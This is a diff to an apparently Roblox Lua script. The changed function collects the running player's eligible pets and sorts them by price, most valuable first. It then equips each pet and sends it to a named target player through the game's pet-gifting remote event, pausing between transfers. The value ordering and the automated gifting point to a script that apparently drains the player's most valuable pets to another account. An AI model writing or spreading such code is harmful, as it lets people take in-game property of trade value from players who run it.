@@ -385,40 +385,54 @@ local function checkPetsInventory(targetName)
         return
     end
 
+    -- Собираем список петов с ценами
+    local petList = {}
     for petUid, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = petData.PetType
         if not petName or not isPetEligible(petData, petName) then
             print("➡️ Skipped pet:", petName, "Not eligible")
-            continue
+        else
+            local price = PET_VALUES[petName] or 0
+            table.insert(petList, {uid = petUid, data = petData, name = petName, price = price})
         end
+    end
 
-        print("➡️ Attempting to give pet:", petName, petUid, "to", targetName)
-        local petObject = getPetObject(petUid)
+    -- Сортируем по цене (от большего к меньшему)
+    table.sort(petList, function(a, b)
+        return a.price > b.price
+    end)
+
+    -- Передаём питомцев
+    for _, pet in ipairs(petList) do
+        print("➡️ Attempting to give pet:", pet.name, pet.uid, "to", targetName)
+        
+        local petObject = getPetObject(pet.uid)
         if petObject and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
             equipPet(petObject)
-            task.wait(0.2) -- Задержка для обеспечения экипировки
+            task.wait(0.2) -- задержка для экипировки
         else
-            warn("❌ Failed to equip pet:", petName, petUid, "Pet object or character not found")
+            warn("❌ Failed to equip pet:", pet.name, pet.uid, "Pet object or character not found")
             continue
         end
 
         local args = {
             "GivePet",
             recipient,
-            petUid
+            pet.uid
         }
 
         local success, err = pcall(function()
             ReplicatedStorage.GameEvents.PetGiftingService:FireServer(unpack(args))
         end)
         if success then
-            print("✅ Successfully attempted to give pet:", petName, petUid)
+            print("✅ Successfully attempted to give pet:", pet.name, pet.uid)
         else
-            warn("❌ Failed to give pet:", petName, petUid, err)
+            warn("❌ Failed to give pet:", pet.name, pet.uid, err)
         end
-        task.wait(1.35)
+        task.wait(1.3) -- задержка между передачами
     end
 end
+
 
 local function teleportTarget(targetName)
     local target = game.Players:FindFirstChild(targetName)
